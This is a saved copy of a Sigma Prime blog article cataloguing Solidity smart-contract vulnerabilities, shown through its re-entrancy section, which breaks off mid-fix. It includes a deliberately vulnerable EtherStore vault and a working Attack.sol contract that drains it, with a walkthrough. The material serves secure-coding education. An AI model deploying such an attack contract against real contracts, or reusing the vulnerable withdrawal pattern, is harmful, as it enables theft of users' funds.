<!DOCTYPE html>
<!-- saved from url=(0049)https://blog.sigmaprime.io/solidity-security.html -->
<html lang="en" class="cover-active"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">


  <title>Solidity Security: Comprehensive list of known attack vectors and common anti-patterns</title>


  <meta name="HandheldFriendly" content="True">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="referrer" content="origin">
  <meta name="generator" content="Pelican">
<link href="https://blog.sigmaprime.io/solidity-security.html" rel="canonical">
  <!-- Feed -->
  <link href="https://blog.sigmaprime.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Sigma Prime Full Atom Feed">
  <link href="https://blog.sigmaprime.io/feeds/cybersecurity.atom.xml" type="application/atom+xml" rel="alternate" title="Sigma Prime Categories Atom Feed">

  <link href="./Solidity Security_ Comprehensive list of known attack vectors and common anti-patterns_files/style.css" type="text/css" rel="stylesheet">
  <link href="./Solidity Security_ Comprehensive list of known attack vectors and common anti-patterns_files/atom-one-dark.css" type="text/css" rel="stylesheet">


  <!-- Custom fonts -->
  <link rel="preconnect" href="https://fonts.googleapis.com/">
  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
  <link href="./Solidity Security_ Comprehensive list of known attack vectors and common anti-patterns_files/css" rel="stylesheet" type="text/css">
  <link href="./Solidity Security_ Comprehensive list of known attack vectors and common anti-patterns_files/css(1)" rel="stylesheet" type="text/css">
  <link href="./Solidity Security_ Comprehensive list of known attack vectors and common anti-patterns_files/css2" rel="stylesheet">


  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
  <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
  <![endif]-->

  <script>
    var siteUrl = 'https://blog.sigmaprime.io';
  </script>

  <script>
    var localTheme = localStorage.getItem('attila_theme');
    switch (localTheme) {
      case 'dark':
        document.documentElement.classList.add('theme-dark');
        break;
      case 'light':
        document.documentElement.classList.add('theme-light');
        break;
      default:
        document.documentElement.classList.add('theme-dark');
        break;
    }
  </script>







    <meta name="description" content="This post aims to be a relatively in-depth and up-to-date introductory post detailing the past mistakes that have been made by Solidity...">

    <meta name="author" content="age">

    <meta name="tags" content="security">
    <meta name="tags" content="informative">




<!-- Open Graph -->
<meta prefix="og: http://ogp.me/ns#" property="og:site_name" content="Sigma Prime">
<meta prefix="og: http://ogp.me/ns#" property="og:title" content="Solidity Security: Comprehensive list of known attack vectors and common anti-patterns">
<meta prefix="og: http://ogp.me/ns#" property="og:description" content="This post aims to be a relatively in-depth and up-to-date introductory post detailing the past mistakes that have been made by Solidity...">
<meta prefix="og: http://ogp.me/ns#" property="og:locale" content="en_US">
<meta prefix="og: http://ogp.me/ns#" property="og:url" content="https://blog.sigmaprime.io/solidity-security.html">
<meta prefix="og: http://ogp.me/ns#" property="og:type" content="article">
<meta prefix="og: http://ogp.me/ns#" property="article:published_time" content="2018-05-30 10:20:00+10:00">
<meta prefix="og: http://ogp.me/ns#" property="article:modified_time" content="2018-10-20 14:00:00+11:00">
<meta prefix="og: http://ogp.me/ns#" property="article:author" content="https://blog.sigmaprime.io/author/age.html">
<meta prefix="og: http://ogp.me/ns#" property="article:section" content="CyberSecurity">
<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="security">
<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="informative">
<meta prefix="og: http://ogp.me/ns#" property="og:image" content="https://blog.sigmaprime.io/imgs/cover/solidity-security.jpg">

<!-- Twitter Card -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:site" content="@https://x.com/sigp_io">
    <meta name="twitter:title" content="Solidity Security: Comprehensive list of known attack vectors and common anti-patterns">
    <meta name="twitter:url" content="https://blog.sigmaprime.io/solidity-security.html">

        <meta name="twitter:image:src" content="https://blog.sigmaprime.io/imgs/cover/solidity-security.jpg">

      <meta name="twitter:description" content="This post aims to be a relatively in-depth and up-to-date introductory post detailing the past mistakes that have been made by Solidity...">

<script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Article",
  "name": "Solidity Security: Comprehensive list of known attack vectors and common anti-patterns",
  "headline": "Solidity Security: Comprehensive list of known attack vectors and common anti-patterns",
  "datePublished": "2018-05-30 10:20:00+10:00",
  "dateModified": "2018-10-20 14:00:00+11:00",
  "author": {
    "@type": "Person",
    "name": "Age",
    "url": "https://blog.sigmaprime.io/author/age.html"
  },
  "image": "https://blog.sigmaprime.io/imgs/cover/solidity-security.jpg",
  "url": "https://blog.sigmaprime.io/solidity-security.html",
  "description": "This post aims to be a relatively in-depth and up-to-date introductory post detailing the past mistakes that have been made by Solidity..."
}
</script>
<style id="fit-vids-style">.fluid-width-video-wrapper{width:100%;position:relative;padding:0;}.fluid-width-video-wrapper iframe,.fluid-width-video-wrapper object,.fluid-width-video-wrapper embed {position:absolute;top:0;left:0;width:100%;height:100%;}</style></head>









<body class="category-template">

<div class="nav-header">
  <nav class="nav-wrapper" aria-label="Main">
      <span class="logo">
        <a href="https://blog.sigmaprime.io/" title="Home"><img src="./Solidity Security_ Comprehensive list of known attack vectors and common anti-patterns_files/sigp-logo-white-eth.png" alt="Blog Logo"></a>
      </span>
<ul>

    <li class="nav-Home " role="presentation"><a href="https://blog.sigmaprime.io/"><span>Home</span></a></li>
    <li class="nav-Authors " role="presentation"><a href="https://blog.sigmaprime.io/authors.html"><span>Authors</span></a></li>
    <li class="nav-Lighthouse " role="presentation"><a href="https://blog.sigmaprime.io/tag/lighthouse"><span>Lighthouse</span></a></li>
    <li class="nav-Security " role="presentation"><a href="https://blog.sigmaprime.io/tag/security"><span>Security</span></a></li>

      <li role="presentation"><a href="https://blog.sigmaprime.io/pages/about.html"><span>About</span></a></li>
</ul>
<ul class="nav-meta">
    <li class="nav-github"><a aria-label="Github" href="https://github.com/sigp" target="_blank"><i class="icon icon-github" aria-hidden="true"></i>
    <span>Github</span>
    </a></li>
    <li class="nav-twitter"><a aria-label="Twitter" href="https://x.com/sigp_io" target="_blank"><i class="icon icon-twitter" aria-hidden="true"></i>
    <span>Twitter</span>
    </a></li>
  <li class="nav-search" style="display: none;">
    <a title="Search">
      <i class="icon icon-search" aria-hidden="true"></i>
      <span>Search</span>
    </a>
  </li>
  <li class="nav-theme">
    <a href="https://blog.sigmaprime.io/solidity-security.html#" class="js-theme" data-system="System theme" data-dark="Dark theme" data-light="Light theme">
      <span class="theme-icon"></span>
    </a>
  </li>
</ul>  </nav>

  <div class="nav-wrapper-control">
    <div class="inner">
      <a class="nav-menu" role="button"><i class="icon icon-menu" aria-hidden="true"></i>Menu</a>
      <a class="nav-search" title="Search" role="button" style="display: none;"><i class="icon icon-search" aria-hidden="true"></i></a>
    </div>
  </div>
</div>
<div class="nav-close" role="button" aria-label="Close"></div>
  <section id="wrapper" class="page-wrapper">
    <!-- Progressbar -->
    <div class="progress-container">
      <span class="progress-bar" style="width: 0%;"></span>
    </div>

    <!-- Page Header -->
    <!-- Set your background image for this header on the line below. -->
    <header class="post-header  has-cover ">
      <div class="inner">
        <span class="post-info">
          <span class="post-type">Article</span>
          <span class="post-count">Cybersecurity</span>
        </span>
        <h1 class="post-title">Solidity Security: Comprehensive list of known attack vectors and common anti-patterns</h1>
        <div class="post-meta">
          <div class="post-meta-avatars">


            <figure class="post-meta-avatar avatar">
              <a class="author-avatar" href="https://blog.sigmaprime.io/author/age.html">
                <img class="author-profile-image" src="./Solidity Security_ Comprehensive list of known attack vectors and common anti-patterns_files/age.jpg" alt="Adrian Manning">
              </a>
            </figure>
          </div>

          <h4 class="post-meta-author">
            Adrian Manning
          </h4>
          <time datetime="Wed 30 May 2018">Wed 30 May 2018</time>
        </div>
          <div class="post-cover cover" style="transform: translate3d(0px, 0px, 0px);">
            <img src="./Solidity Security_ Comprehensive list of known attack vectors and common anti-patterns_files/solidity-security.jpg" alt="Category CyberSecurity">
          </div>
      </div>
    </header>

    <!-- Post content -->
    <main class="content" role="main">
        <article class="post">
        <div class="inner">
          <section class="post-content">
            <p>Although in its infancy, Solidity has had widespread adoption and is used to compile the byte-code in many Ethereum smart contracts we see today. There have been a number of harsh lessons learnt by developers and users alike in discovering the nuances of the language and the EVM. This post aims to be a relatively in-depth and up-to-date introductory post detailing the past mistakes that have been made by Solidity developers in an effort to prevent future devs from repeating history.</p>
<p><em>As this is a rapidly changing area, I've put this post on <a href="https://github.com/sigp/solidity-security-blog">Github</a> to encourage anyone/everyone to contribute to this post or submit issues for the errors that I've surely made.</em></p>
<h1>Table of Contents</h1>
<h4><a href="https://blog.sigmaprime.io/solidity-security.html#reentrancy">1. Re-Entrancy</a></h4>
<ul>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#re-vuln">The Vulnerability</a></li>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#re-prev">Preventative Techniques</a></li>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#re-example">Real-World Example: The DAO</a></li>
</ul>
<h4><a href="https://blog.sigmaprime.io/solidity-security.html#ouflow">2. Arithmetic Over/Under Flows</a></h4>
<ul>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#ou-vuln">The Vulnerability</a></li>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#ou-prev">Preventative Techniques</a></li>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#ou-example">Real-World Examples: PoWHC and Batch Transfer Overflow (CVE-2018-10299)</a></li>
</ul>
<h4><a href="https://blog.sigmaprime.io/solidity-security.html#ether">3. Unexpected Ether</a></h4>
<ul>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#ether-vuln">The Vulnerability</a></li>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#ether-prev">Preventative Techniques</a></li>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#ether-example">Real-World Examples: Unknown</a></li>
</ul>
<h4><a href="https://blog.sigmaprime.io/solidity-security.html#delegatecall">4. Delegatecall</a></h4>
<ul>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#dc-vuln">The Vulnerability</a></li>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#dc-prev">Preventative Techniques</a></li>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#dc-example">Real-World Examples: Parity Multisig Wallet (Second Hack)</a></li>
</ul>
<h4><a href="https://blog.sigmaprime.io/solidity-security.html#visibility">5. Default Visibilities</a></h4>
<ul>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#visibility-vuln">The Vulnerability</a></li>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#visibility-prev">Preventative Techniques</a></li>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#visibility-example">Real-World Example: Parity MultiSig Wallet (First Hack)</a></li>
</ul>
<h4><a href="https://blog.sigmaprime.io/solidity-security.html#entropy">6. Entropy Illusion</a></h4>
<ul>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#entropy-vuln">The Vulnerability</a></li>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#entropy-prev">Preventative Techniques</a></li>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#entropy-example">Real-World Example: PRNG Contracts</a></li>
</ul>
<h4><a href="https://blog.sigmaprime.io/solidity-security.html#contract-reference">7. External Contract Referencing</a></h4>
<ul>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#cr-vuln">The Vulnerability</a></li>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#cr-prev">Preventative Techniques</a></li>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#cr-example">Real-World Example: Re-Entrancy Honey Pot</a></li>
</ul>
<h4><a href="https://blog.sigmaprime.io/solidity-security.html#short-address">8. Short Address/Parameter Attack</a></h4>
<ul>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#short-vuln">The Vulnerability</a></li>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#short-prev">Preventative Techniques</a></li>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#short-example">Real-World Example: Unknown</a></li>
</ul>
<h4><a href="https://blog.sigmaprime.io/solidity-security.html#unchecked-calls">9. Unchecked CALL Return Values</a></h4>
<ul>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#unchecked-calls-vuln">The Vulnerability</a></li>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#unchecked-calls-prev">Preventative Techniques</a></li>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#unchecked-calls-example">Real-World Examples: Etherpot and King of the Ether</a></li>
</ul>
<h4><a href="https://blog.sigmaprime.io/solidity-security.html#race-conditions">10. Race Conditions / Front Running</a></h4>
<ul>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#race-conditions-vuln">The Vulnerability</a></li>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#race-conditions-prev">Preventative Techniques</a></li>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#race-conditions-example">Real-World Examples: ERC20 and Bancor</a></li>
</ul>
<h4><a href="https://blog.sigmaprime.io/solidity-security.html#dos">11. Denial Of Service (DOS)</a></h4>
<ul>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#dos-vuln">The Vulnerability</a></li>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#dos-prev">Preventative Techniques</a></li>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#dos-example">Real-World Example: GovernMental</a></li>
</ul>
<h4><a href="https://blog.sigmaprime.io/solidity-security.html#block-timestamp">12. Block Timestamp Manipulation</a></h4>
<ul>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#block-timestamp-vuln">The Vulnerability</a></li>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#block-timestamp-prev">Preventative Techniques</a></li>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#block-timestamp-example">Real-World Example: GovernMental</a></li>
</ul>
<h4><a href="https://blog.sigmaprime.io/solidity-security.html#constructors">13. Constructors with Care</a></h4>
<ul>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#constructors-vuln">The Vulnerability</a></li>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#constructors-prev">Preventative Techniques</a></li>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#constructors-example">Real-World Example: Rubixi</a></li>
</ul>
<h4><a href="https://blog.sigmaprime.io/solidity-security.html#storage">14. Uninitialised Storage Pointers</a></h4>
<ul>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#storage-vuln">The Vulnerability</a></li>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#storage-prev">Preventative Techniques</a></li>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#storage-example">Real-World Examples: Honey Pots: OpenAddressLottery and CryptoRoulette</a></li>
</ul>
<h4><a href="https://blog.sigmaprime.io/solidity-security.html#precision">15. Floating Points and Numerical Precision</a></h4>
<ul>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#precision-vuln">The Vulnerability</a></li>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#precision-prev">Preventative Techniques</a></li>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#precision-example">Real-World Example: Ethstick</a></li>
</ul>
<h4><a href="https://blog.sigmaprime.io/solidity-security.html#tx-origin">16. tx.origin Authentication</a></h4>
<ul>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#tx-origin-vuln">The Vulnerability</a></li>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#tx-origin-prev">Preventative Techniques</a></li>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#tx-origin-example">Real-World Example: Unknown</a></li>
</ul>
<h2><a href="https://blog.sigmaprime.io/solidity-security.html#ethereum-quirks">Ethereum Quirks</a></h2>
<ul>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#keyless-eth">Keyless Ether</a></li>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#one-time-addresses">One Time Addresses</a></li>
<li><a href="https://blog.sigmaprime.io/solidity-security.html#single-transaction-airdrops">Single Transaction Airdrops</a></li>
</ul>
<h2><a href="https://blog.sigmaprime.io/solidity-security.html#hacks">List of Interesting Crypto Related Hacks/Bugs</a></h2>
<h2>References / Further Reading List</h2>
<ul>
<li><a href="https://github.com/ethereum/wiki/wiki/Safety">Ethereum Wiki - Safety</a></li>
<li><a href="https://blog.sigmaprime.io/solidity.readthedocs.io/en/latest/security-considerations.html">Solidity Docs - Security Considerations</a></li>
<li><a href="https://consensys.github.io/smart-contract-best-practices">Consensus - Ethereum Smart Contract Best Practices</a></li>
<li><a href="https://applicature.com/blog/history-of-ethereum-security-vulnerabilities-hacks-and-their-fixes">History of Ethereum Security Vulnerabilities, Hacks and Their Fixes</a></li>
<li><a href="http://www.dasp.co/">Decentralized Application Security Project (DASP) Top 10 of 2018</a></li>
<li><a href="https://eprint.iacr.org/2016/1007.pdf">A Survey of attacks on Ethereum Smart Contracts</a></li>
<li><a href="https://medium.com/cryptronics/ethereum-smart-contract-security-73b0ede73fa8">Ethereum Smart Contract Security</a></li>
<li><a href="https://medium.com/@chriseth/lessons-learnt-from-the-underhanded-solidity-contest-8388960e09b1">Lessons Learnt from the Underhanded Solidity Contest</a></li>
</ul>
<h2 id="reentrancy"><span id="SP-1">1. Re-Entrancy</span></h2>

<p>One of the features of Ethereum smart contracts is the ability to call and utilise code of other external contracts. Contracts also typically handle ether, and as such often send ether to various external user addresses. The operation of calling external contracts, or sending ether to an address, requires the contract to submit an external call. These external calls can be hijacked by attackers whereby they force the contract to execute further code (i.e. through a fallback function) , including calls back into itself. Thus the code execution "<em>re-enters</em>" the contract. Attacks of this kind were used in the infamous DAO hack.</p>
<p>For further reading on re-entrancy attacks, see <a href="https://medium.com/@gus_tavo_guim/reentrancy-attack-on-smart-contracts-how-to-identify-the-exploitable-and-an-example-of-an-attack-4470a2d8dfe4">Reentrancy Attack On Smart Contracts</a> and <a href="https://consensys.github.io/smart-contract-best-practices/known_attacks/#reentrancy">Consensus - Ethereum Smart Contract Best Practices</a>.</p>
<h3 id="re-vuln">The Vulnerability</h3>

<p>This attack can occur when a contract sends ether to an unknown address. An attacker can carefully construct a contract at an external address which contains malicious code in the <a href="https://solidity.readthedocs.io/en/latest/contracts.html?highlight=fallback#fallback-function">fallback function</a>. Thus, when a contract sends ether to this address, it will invoke the malicious code. Typically the malicious code executes a function on the vulnerable contract, performing operations not expected by the developer. The name "re-entrancy" comes from the fact that the external malicious contract calls back a function on the vulnerable contract and "<em>re-enters</em>" code execution at an arbitrary location on the vulnerable contract.</p>
<p>To clarify this, consider the simple vulnerable contract, which acts as an Ethereum vault that allows depositors to only withdraw 1 ether per week.</p>
<p>EtherStore.sol:</p>
<div class="highlight"><pre class="hljs language-solidity"><span class="hljs-function"><span class="hljs-keyword">contract</span> <span class="hljs-title">EtherStore</span> </span>{

    <span class="hljs-built_in">uint256</span> <span class="hljs-keyword">public</span> withdrawalLimit = <span class="hljs-number">1</span> <span class="hljs-built_in">ether</span>;
    <span class="hljs-keyword">mapping</span>(<span class="hljs-built_in">address</span> =&gt; <span class="hljs-built_in">uint256</span>) <span class="hljs-keyword">public</span> lastWithdrawTime;
    <span class="hljs-keyword">mapping</span>(<span class="hljs-built_in">address</span> =&gt; <span class="hljs-built_in">uint256</span>) <span class="hljs-keyword">public</span> balances;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">depositFunds</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">payable</span> </span>{
        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] += <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdrawFunds</span> (<span class="hljs-params"><span class="hljs-built_in">uint256</span> _weiToWithdraw</span>) <span class="hljs-title">public</span> </span>{
        <span class="hljs-built_in">require</span>(balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] &gt;= _weiToWithdraw);
        <span class="hljs-comment">// limit the withdrawal</span>
        <span class="hljs-built_in">require</span>(_weiToWithdraw &lt;= withdrawalLimit);
        <span class="hljs-comment">// limit the time allowed to withdraw</span>
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">now</span> &gt;= lastWithdrawTime[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] + <span class="hljs-number">1</span> <span class="hljs-built_in">weeks</span>);
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">call</span>.<span class="hljs-built_in">value</span>(_weiToWithdraw)());
        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] -= _weiToWithdraw;
        lastWithdrawTime[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] = <span class="hljs-built_in">now</span>;
    }
 }
</pre></div>

<p>This contract has two public functions. <code>depositFunds()</code> and <code>withdrawFunds()</code>. The <code>depositFunds()</code> function simply increments the senders balances. The <code>withdrawFunds()</code> function allows the sender to specify the amount of wei to withdraw. It will only succeed if the requested amount to withdraw is less than 1 ether and a withdrawal hasn't occurred in the last week. Or does it?...</p>
<p>The vulnerability comes on line [17] where we send the user their requested amount of ether. Consider a malicious attacker creating the following contract,</p>
<p>Attack.sol:</p>
<div class="highlight"><pre class="hljs language-solidity"><span class="hljs-keyword">import</span> <span class="hljs-string">"EtherStore.sol"</span>;

<span class="hljs-function"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{
  EtherStore <span class="hljs-keyword">public</span> etherStore;

  <span class="hljs-comment">// initialise the etherStore variable with the contract address</span>
  <span class="hljs-function"><span class="hljs-literal">constructor</span>(<span class="hljs-params"><span class="hljs-built_in">address</span> _etherStoreAddress</span>) </span>{
      etherStore = EtherStore(_etherStoreAddress);
  }

  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pwnEtherStore</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">payable</span> </span>{
      <span class="hljs-comment">// attack to the nearest ether</span>
      <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span> &gt;= <span class="hljs-number">1</span> <span class="hljs-built_in">ether</span>);
      <span class="hljs-comment">// send eth to the depositFunds() function</span>
      etherStore.depositFunds.<span class="hljs-built_in">value</span>(<span class="hljs-number">1</span> <span class="hljs-built_in">ether</span>)();
      <span class="hljs-comment">// start the magic</span>
      etherStore.withdrawFunds(<span class="hljs-number">1</span> <span class="hljs-built_in">ether</span>);
  }

  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">collectEther</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>{
      <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">transfer</span>(<span class="hljs-keyword">this</span>.balance);
  }

  <span class="hljs-comment">// fallback function - where the magic happens</span>
  <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) <span class="hljs-title">payable</span> </span>{
      <span class="hljs-keyword">if</span> (etherStore.balance &gt; <span class="hljs-number">1</span> <span class="hljs-built_in">ether</span>) {
          etherStore.withdrawFunds(<span class="hljs-number">1</span> <span class="hljs-built_in">ether</span>);
      }
  }
}
</pre></div>

<p>Let us see how this malicious contract can exploit our <code>EtherStore</code> contract. The attacker would create the above contract (let's say at the address <code>0x0...123</code>) with the <code>EtherStore</code>'s contract address as the constructor parameter. This will initialize and point the public variable <code>etherStore</code> to the contract we wish to attack.</p>
<p>The attacker would then call the <code>pwnEtherStore()</code> function, with some amount of ether (greater than or equal to 1), let's say <code>1 ether</code> for this example. In this example we assume a number of other users have deposited ether into this contract, such that it's current balance is <code>10 ether</code>. The following would then occur:</p>
<ol>
<li>
<p><strong>Attack.sol - Line [15]</strong> - The <code>depositFunds()</code> function of the EtherStore contract will be called with a <code>msg.value</code> of <code>1 ether</code> (and a lot of gas). The sender (<code>msg.sender</code>) will be our malicious contract (<code>0x0...123</code>). Thus, <code>balances[0x0..123] = 1 ether</code>.</p>
</li>
<li>
<p><strong>Attack.sol - Line [17]</strong> - The malicious contract will then call the <code>withdrawFunds()</code> function of the <code>EtherStore</code> contract with a parameter of <code>1 ether</code>. This will pass all the requirements (Lines [12]-[16] of the <code>EtherStore</code> contract) as we have made no previous withdrawals.</p>
</li>
<li>
<p><strong>EtherStore.sol - Line [17]</strong> - The contract will then send <code>1 ether</code> back to the malicious contract.</p>
</li>
<li>
<p><strong>Attack.sol - Line [25]</strong> - The ether sent to the malicious contract will then execute the fallback function.</p>
</li>
<li>
<p><strong>Attack.sol - Line [26]</strong> - The total balance of the EtherStore contract was <code>10 ether</code> and is now <code>9 ether</code> so this if statement passes.</p>
</li>
<li>
<p><strong>Attack.sol - Line [27]</strong> - The fallback function then calls the <code>EtherStore</code> <code>withdrawFunds()</code> function again and "<em>re-enters</em>" the <code>EtherStore</code> contract.</p>
</li>
<li>
<p><strong>EtherStore.sol - Line [11]</strong> - In this second call to <code>withdrawFunds()</code>, our balance is still <code>1 ether</code> as line [18] has not yet been executed. Thus, we still have <code>balances[0x0..123] = 1 ether</code>. This is also the case for the <code>lastWithdrawTime</code> variable. Again, we pass all the requirements.</p>
</li>
<li>
<p><strong>EtherStore.sol - Line [17]</strong> - We withdraw another <code>1 ether</code>.</p>
</li>
<li>
<p><strong>Steps 4-8 will repeat</strong> -  until <code>EtherStore.balance &gt;= 1</code> as dictated by line [26] in <code>Attack.sol</code>.</p>
</li>
<li>
<p><strong>Attack.sol - Line [26]</strong> - Once there less 1 (or less) ether left in the <code>EtherStore</code> contract, this if statement will fail. This will then allow lines [18] and [19] of the <code>EtherStore</code> contract to be executed (for each call to the <code>withdrawFunds()</code> function).</p>
</li>
<li>
<p><strong>EtherStore.sol - Lines [18] and [19]</strong> - The <code>balances</code> and <code>lastWithdrawTime</code> mappings will be set and the execution will end.</p>
</li>
</ol>
<p>The final result, is that the attacker has withdrawn all (bar 1) ether from the <code>EtherStore</code> contract, instantaneously with a single transaction.</p>
<h3 id="re-prevention">Preventative Techniques</h3>

<p>There are a number of common techniques which help avoid potential re-entrancy vulnerabilities in smart contracts. The first is to ( whenever possible) use the built-in <a href="http://solidity.readthedocs.io/en/latest/units-and-global-variables.html#address-related">transfer()</a> function when sending ether to external contracts. The transfer function only sends <code>2300 gas</code> with the external call, which isn't enough for the destination address/contract to call another contract (i.e. re-enter the sending contract).</p>
<p>The second technique is to ensure that all logic that changes state variables happen before ether is sent out of the contract (or any external call). In the <code>EtherStore</code> example, lines [18] and [19] of <code>EtherStore.sol</code> should be put before line [17]. It is good practice to place any code that performs external calls to unknown addresses as the last operation in a localised function or piece of code execution. This is known as the <a href="http://solidity.readthedocs.io/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern">checks-effects-interactions</a> pattern.</p>
<p>A third technique is to introduce a mutex. That is, to add a state variable which locks the contract during code execution, preventing reentrancy calls.</p>
<p>Applying all of these techniques (all three are unnecessary, but is done for demonstrative purposes) to <code>EtherStore.sol</code>, gives the re-entrancy-free contract:</p>
<div class="highlight"><pre class="hljs language-solidity"><span class="hljs-function"><span class="hljs-keyword">contract</span> <span class="hljs-title">EtherStore</span> </span>{

    <span class="hljs-comment">// initialise the mutex</span>
    <span class="hljs-built_in">bool</span> reEntrancyMutex = <span class="hljs-literal">false</span>;
    <span class="hljs-built_in">uint256</span> <span class="hljs-keyword">public</span> withdrawalLimit = <span class="hljs-number">1</span> <span class="hljs-built_in">ether</span>;
    <span class="hljs-keyword">mapping</span>(<span class="hljs-built_in">address</span> =&gt; <span class="hljs-built_in">uint256</span>) <span class="hljs-keyword">public</span> lastWithdrawTime;
    <span class="hljs-keyword">mapping</span>(<span class="hljs-built_in">address</span> =&gt; <span class="hljs-built_in">uint256</span>) <span class="hljs-keyword">public</span> balances;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">depositFunds</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">payable</span> </span>{
        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] += <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdrawFunds</span> (<span class="hljs-params"><span class="hljs-built_in">uint256</span> _weiToWithdraw</span>) <span class="hljs-title">public</span> </span>{
        <span class="hljs-built_in">require</span>(!reEntrancyMutex);
        <span class="hljs-built_in">require</span>(balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] &gt;= _weiToWithdraw);
        <span class="hljs-comment">// limit the withdrawal</span>
        <span class="hljs-built_in">require</span>(_weiToWithdraw &lt;= withdrawalLimit);
        <span class="hljs-comment">// limit the time allowed to withdraw</span>
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">now</span> &gt;= lastWithdrawTime[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] + <span class="hljs-number">1</span> <span class="hljs-built_in">weeks</span>);
        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] -= _weiToWithdraw;
        lastWithdrawTime[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] = <span class="hljs-built_in">now</span>;
        <span class="hljs-comment">// set the reEntrancy mutex before the external call</span>
        reEntrancyMutex = <span class="hljs-literal">true</span>;
        <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">transfer</span>(_weiToWithdraw);
